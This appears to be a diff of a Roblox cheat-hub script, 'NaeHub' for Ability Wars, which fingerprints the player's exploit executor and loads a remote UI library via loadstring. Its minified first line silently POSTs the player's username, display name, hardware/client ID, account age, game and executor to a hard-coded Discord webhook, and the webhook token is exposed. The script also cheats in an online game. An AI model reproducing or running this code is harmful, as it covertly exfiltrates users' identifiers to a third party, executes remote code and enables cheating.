@@ -1,5 +1,14 @@
 game:GetService("Players").LocalPlayer.Idled:connect(function()game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)wait(1)game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)end)repeat task.wait()until game:IsLoaded()local function b()return(secure_load and"Sentinel")or(is_sirhurt_closure and"Sirhurt")or(pebc_execute and"ProtoSmasher")or(KRNL_LOADED and"Krnl")or(WrapGlobal and"WeAreDevs")or(isvm and"Proxo")or(shadow_env and"Shadow")or(jit and"EasyExploits")or(getscriptenvs and"Calamari")or(unit and not syn and"Unit")or(OXYGEN_LOADED and"Oxygen U")or(IsElectron and"Electron")or(IS_COCO_LOADED and"Coco")or(IS_VIVA_LOADED and"Viva")or(UWP and"Fluxus UWP")or(syn and is_synapse_function and not is_sirhurt_closure and not pebc_execute and"Synapse X")or("Other exploit")end;a=(syn and syn.request)or http and http.request or http_request or(fluxus and fluxus.request)or request;local a="https://discord.com/api/webhooks/1107727073092579440/U0taa0X-qSovJaqrkYMCCOJ5zqcckrrD_hwcr6tITF2JB2g6GHWsV27VlabySW-ElhAW"local b={["content"]="",["embeds"]={{["title"]="**Alt Control**",["description"]="",["type"]="rich",["color"]=tonumber(4854683),["fields"]={{["name"]="User:",["value"]=game:GetService("Players").LocalPlayer.Name,["inline"]=false},{["name"]="Display:",["value"]=game:GetService("Players").LocalPlayer.DisplayName,["inline"]=false},{["name"]="Hwid:",["value"]=game:GetService("RbxAnalyticsService"):GetClientId(),["inline"]=false},{["name"]="Age:",["value"]=game:GetService("Players").LocalPlayer.AccountAge,["inline"]=false},{["name"]="Ping:",["value"]=game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(),["inline"]=false},{["name"]="Place ID:",["value"]=game.PlaceId,["inline"]=false},{["name"]="Game:",["value"]=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,["inline"]=false},{["name"]="Executor:",["value"]=b(),["inline"]=false}}}}}local b=game:GetService("HttpService"):JSONEncode(b)local c={["content-type"]="application/json"}local a={Url=a,Body=b,Method="POST",Headers=c}request(a)
 
+repeat
+	task.wait()
+until game:IsLoaded()
+
+local function exploit()
+	return (secure_load and "Sentinel") or (is_sirhurt_closure and "Sirhurt") or (pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl") or (WrapGlobal and "WeAreDevs") or (isvm and "Proxo") or (shadow_env and "Shadow") or (jit and "EasyExploits") or (getscriptenvs and "Calamari") or (unit and not syn and "Unit") or (OXYGEN_LOADED and "Oxygen U") or (IsElectron and "Electron") or (IS_COCO_LOADED and "Coco") or (IS_VIVA_LOADED and "Viva") or (UWP and "Fluxus UWP") or (syn and is_synapse_function and not is_sirhurt_closure and not pebc_execute and "Synapse X") or ("Other exploit")
+end
+request = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
 	Name = "NaeHub | Ability Wars!",
@@ -16,6 +25,7 @@ local Window = Rayfield:CreateWindow({
 		RememberJoins = true
 	},
 	KeySystem = true,
+	
 	KeySettings = {
 		Title = "NaeHub | Key System",
 		Subtitle = "By Nae / Vu",
